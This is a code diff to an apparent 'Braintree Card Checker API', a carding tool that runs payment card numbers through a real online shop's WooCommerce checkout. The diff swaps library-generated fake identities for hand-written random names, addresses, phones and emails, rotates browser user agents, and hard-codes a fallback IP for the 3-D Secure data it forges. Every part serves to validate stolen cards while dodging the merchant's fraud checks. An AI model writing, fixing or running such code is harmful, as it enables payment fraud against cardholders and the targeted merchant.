@@ -2,14 +2,13 @@ from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 import requests
 import re
-from fake_useragent import FakeUserAgent
-from faker import Faker
 from bs4 import BeautifulSoup
 import base64
 import json
 import uuid
 import datetime
 import os
+import random
 from typing import Optional
 
 app = FastAPI(title="Braintree Card Checker API", version="1.0.0")
@@ -59,6 +58,69 @@ def card_type(card_num):
     else:
         return "CARD TYPE"
 
+def get_user_agent():
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+    ]
+    return random.choice(user_agents)
+
+def generate_fake_data():
+    first_names = ["John", "Jane", "Michael", "Sarah", "David", "Lisa", "Robert", "Emily", "James", "Ashley"]
+    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH", "NC", "GA"]
+    
+    first_name = random.choice(first_names)
+    last_name = random.choice(last_names)
+    city = random.choice(cities)
+    state = random.choice(states)
+    
+    street_num = random.randint(100, 9999)
+    street_names = ["Main St", "Oak Ave", "Pine St", "Maple Dr", "Cedar Ln", "Elm St", "Park Ave", "First St", "Second St", "Third St"]
+    street_address = f"{street_num} {random.choice(street_names)}"
+    
+    zip_code = f"{random.randint(10000, 99999)}"
+    phone = f"{random.randint(200, 999)}-{random.randint(200, 999)}-{random.randint(1000, 9999)}"
+    email = f"{first_name.lower()}.{last_name.lower()}@gmail.com"
+    
+    return {
+        "first_name": first_name,
+        "last_name": last_name,
+        "street_address": street_address,
+        "city": city,
+        "state": state,
+        "zip_code": zip_code,
+        "phone": phone,
+        "email": email
+    }
+
+def generate_fake_data_es():
+    first_names = ["Carlos", "Maria", "Jose", "Ana", "Francisco", "Carmen", "Antonio", "Isabel", "Manuel", "Pilar"]
+    last_names = ["Garcia", "Rodriguez", "Lopez", "Martinez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Cruz", "Flores"]
+    cities = ["Barcelona", "Madrid", "Valencia", "Sevilla", "Zaragoza", "Malaga", "Murcia", "Palma", "Bilbao", "Alicante"]
+    
+    first_name = random.choice(first_names)
+    last_name = random.choice(last_names)
+    city = random.choice(cities)
+    
+    street_num = random.randint(1, 200)
+    street_names = ["Calle Mayor", "Avenida Principal", "Plaza Central", "Calle Real", "Paseo Maritimo"]
+    street_address = f"{random.choice(street_names)} {street_num}"
+    
+    zip_code = f"11{random.randint(100, 999)}"
+    
+    return {
+        "first_name": first_name,
+        "last_name": last_name,
+        "street_address": street_address,
+        "city": city,
+        "zip_code": zip_code
+    }
+
 def get_ip_address():
     try:
         resp = requests.get("https://api.ipify.org?format=json", timeout=30)
@@ -66,38 +128,23 @@ def get_ip_address():
             return resp.json().get("ip", "")
         else:
             print(f"[ERROR] Failed to get IP address: {resp.status_code}")
-            return ""
+            return "8.8.8.8"  # Fallback IP
     except Exception as e:
         print(f"[ERROR] Failed to get IP address: {e}")
-        return ""
+        return "8.8.8.8"  # Fallback IP
 
 def braintree_payment(card_data):
     card_num, card_mm, card_yy, card_cvv = card_data
     
-    user_agent = str(FakeUserAgent(os=["Windows"]).chrome)
-    fake_us = Faker(locale="en_US")
-    first_name = fake_us.first_name()
-    last_name = fake_us.last_name()
-    street_address = fake_us.street_address()
-    city = fake_us.city()
-    zip_code = fake_us.zipcode()
-    phone = fake_us.numerify("$0%%#$####")
-    email = fake_us.email()
-
-    fake_es = Faker(locale="es_ES")
-    first_name_es = fake_es.first_name()
-    last_name_es = fake_es.last_name()
-    street_address_es = fake_es.street_address()
-    city_es = "Barcelona"
-    zip_code_es = fake_es.numerify("11###")
-
+    user_agent = get_user_agent()
+    fake_data = generate_fake_data()
+    fake_data_es = generate_fake_data_es()
+    
     session_id = str(uuid.uuid4())
     reference_id = str(uuid.uuid4())
     start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     ip_address = get_ip_address()
-    if not ip_address:
-        return "error", "Could not retrieve IP address"
 
     session = requests.Session()
     session.headers.update({'User-Agent': user_agent})
@@ -245,8 +292,8 @@ def braintree_payment(card_data):
                             ),
                             "cvv": card_cvv,
                             "billingAddress": {
-                                "postalCode": zip_code,
-                                "streetAddress": street_address,
+                                "postalCode": fake_data["zip_code"],
+                                "streetAddress": fake_data["street_address"],
                             },
                         },
                         "options": {"validate": False},
@@ -293,25 +340,25 @@ def braintree_payment(card_data):
                 "browserTimeZone": 240,
                 "deviceChannel": "Browser",
                 "additionalInfo": {
-                    "shippingGivenName": first_name,
-                    "shippingSurname": last_name,
+                    "shippingGivenName": fake_data["first_name"],
+                    "shippingSurname": fake_data["last_name"],
                     "ipAddress": ip_address,
-                    "billingLine1": street_address,
-                    "billingLine2": street_address,
-                    "billingCity": city,
+                    "billingLine1": fake_data["street_address"],
+                    "billingLine2": fake_data["street_address"],
+                    "billingCity": fake_data["city"],
                     "billingState": "",
-                    "billingPostalCode": zip_code,
+                    "billingPostalCode": fake_data["zip_code"],
                     "billingCountryCode": "US",
-                    "billingPhoneNumber": phone,
-                    "billingGivenName": first_name_es,
-                    "billingSurname": last_name_es,
-                    "shippingLine1": street_address_es,
-                    "shippingLine2": street_address_es,
-                    "shippingCity": city_es,
+                    "billingPhoneNumber": fake_data["phone"],
+                    "billingGivenName": fake_data_es["first_name"],
+                    "billingSurname": fake_data_es["last_name"],
+                    "shippingLine1": fake_data_es["street_address"],
+                    "shippingLine2": fake_data_es["street_address"],
+                    "shippingCity": fake_data_es["city"],
                     "shippingState": "",
-                    "shippingPostalCode": zip_code_es,
+                    "shippingPostalCode": fake_data_es["zip_code"],
                     "shippingCountryCode": "ES",
-                    "email": email,
+                    "email": fake_data["email"],
                 },
                 "bin": card_num[:6],
                 "dfReferenceId": f"0_{reference_id}",
@@ -371,26 +418,26 @@ def braintree_payment(card_data):
                 "x-requested-with": "XMLHttpRequest",
             },
             data={
-                "email": email,
+                "email": fake_data["email"],
                 "action": "bwfan_insert_abandoned_cart",
                 "checkout_fields_data[shipping_same_as_billing]": "1",
-                "checkout_fields_data[shipping_postcode]": zip_code_es,
+                "checkout_fields_data[shipping_postcode]": fake_data_es["zip_code"],
                 "checkout_fields_data[shipping_state]": "",
-                "checkout_fields_data[shipping_city]": city_es,
-                "checkout_fields_data[shipping_address_2]": street_address_es,
-                "checkout_fields_data[shipping_address_1]": street_address_es,
+                "checkout_fields_data[shipping_city]": fake_data_es["city"],
+                "checkout_fields_data[shipping_address_2]": fake_data_es["street_address"],
+                "checkout_fields_data[shipping_address_1]": fake_data_es["street_address"],
                 "checkout_fields_data[shipping_country]": "US",
-                "checkout_fields_data[shipping_last_name]": last_name_es,
-                "checkout_fields_data[shipping_first_name]": first_name_es,
-                "checkout_fields_data[billing_postcode]": zip_code,
+                "checkout_fields_data[shipping_last_name]": fake_data_es["last_name"],
+                "checkout_fields_data[shipping_first_name]": fake_data_es["first_name"],
+                "checkout_fields_data[billing_postcode]": fake_data["zip_code"],
                 "checkout_fields_data[billing_state]": "",
-                "checkout_fields_data[billing_city]": city,
-                "checkout_fields_data[billing_address_2]": street_address,
-                "checkout_fields_data[billing_address_1]": street_address,
+                "checkout_fields_data[billing_city]": fake_data["city"],
+                "checkout_fields_data[billing_address_2]": fake_data["street_address"],
+                "checkout_fields_data[billing_address_1]": fake_data["street_address"],
                 "checkout_fields_data[billing_country]": "US",
-                "checkout_fields_data[billing_phone]": phone,
-                "checkout_fields_data[billing_last_name]": last_name,
-                "checkout_fields_data[billing_first_name]": first_name,
+                "checkout_fields_data[billing_phone]": fake_data["phone"],
+                "checkout_fields_data[billing_last_name]": fake_data["last_name"],
+                "checkout_fields_data[billing_first_name]": fake_data["first_name"],
                 "checkout_fields_data[ws_opt_in]": "1",
                 "last_edit_field": "billing_country",
                 "current_step": "single_step",
@@ -434,7 +481,7 @@ def braintree_payment(card_data):
                 "wfacp_cart_contains_subscription": "0",
                 "wfacp_exchange_keys": '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}',
                 "wfacp_input_hidden_data": "{}",
-                "wfacp_input_phone_field": f'{{"billing":{{"code":"1","number":"{phone}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}}}',
+                "wfacp_input_phone_field": f'{{"billing":{{"code":"1","number":"{fake_data["phone"]}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}}}',
                 "wfacp_timezone": "America/New_York",
                 "wc_order_attribution_source_type": "typein",
                 "wc_order_attribution_referrer": "https://nammanmuay.eu/namman-muay-cream-100g/",
@@ -456,24 +503,24 @@ def braintree_payment(card_data):
                 "wfob_input_hidden_data": "{}",
                 "wfob_input_bump_shown_ids": "54600",
                 "wfob_input_bump_global_data": "",
-                "billing_email": email,
+                "billing_email": fake_data["email"],
                 "bwfan_cart_id": cart_id or "",
-                "billing_first_name": first_name,
-                "billing_last_name": last_name,
-                "billing_address_1": street_address,
-                "billing_address_2": street_address,
+                "billing_first_name": fake_data["first_name"],
+                "billing_last_name": fake_data["last_name"],
+                "billing_address_1": fake_data["street_address"],
+                "billing_address_2": fake_data["street_address"],
                 "billing_country": "US",
-                "billing_city": city,
-                "billing_postcode": zip_code,
-                "billing_phone": phone,
+                "billing_city": fake_data["city"],
+                "billing_postcode": fake_data["zip_code"],
+                "billing_phone": fake_data["phone"],
                 "shipping_same_as_billing": "1",
-                "shipping_first_name": first_name_es,
-                "shipping_last_name": last_name_es,
-                "shipping_address_1": street_address_es,
-                "shipping_address_2": street_address_es,
+                "shipping_first_name": fake_data_es["first_name"],
+                "shipping_last_name": fake_data_es["last_name"],
+                "shipping_address_1": fake_data_es["street_address"],
+                "shipping_address_2": fake_data_es["street_address"],
                 "shipping_country": "ES",
-                "shipping_city": city_es,
-                "shipping_postcode": zip_code_es,
+                "shipping_city": fake_data_es["city"],
+                "shipping_postcode": fake_data_es["zip_code"],
                 "wfacp_coupon_field": "",
                 "shipping_method[0]": "flat_rate:53",
                 "payment_method": "braintree_cc",
